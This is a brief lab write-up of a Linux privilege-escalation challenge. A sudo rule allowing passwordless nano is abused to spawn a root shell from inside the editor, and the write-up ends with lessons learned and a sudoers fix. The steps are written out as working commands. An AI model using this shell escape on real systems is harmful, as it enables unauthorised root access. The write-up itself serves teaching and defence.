# Linux Privilege Escalation Challenge 01

## 📝 Challenge Description
A low-privileged user account was provided.  
The goal was to escalate privileges and gain root access.

---

## 🔍 Step 1: Initial Enumeration
I started with basic enumeration:
whoami
id
uname -a
sudo -l
`sudo -l` returned:
(ALL) NOPASSWD: /usr/bin/nano
This meant the user could run **nano with no password** using sudo.

---

## 💡 Step 2: Privilege Escalation Using Nano
Nano can spawn a shell.

I executed: sudo nano
Inside nano, I pressed:
Ctrl + R   (Read File)
Ctrl + X   (Execute Command)
Then entered:
/bin/bash
This opened a **root shell**.

---

## 🚩 Step 3: Confirming Root Privileges
whoami
Returned:
root
Privilege escalation successful.

---

## 📘 Lessons Learned
- Always check `sudo -l` for misconfigurations  
- Seemingly harmless binaries (nano, vim, less, find) can be used to spawn shells  
- This type of misconfiguration is extremely common in real systems  

---

## 🔐 How to Fix the Vulnerability
Edit the sudoers file:
sudo visudo
Remove:
(ALL) NOPASSWD: /usr/bin/nano
Only allow restricted, safe commands for non-admin users.
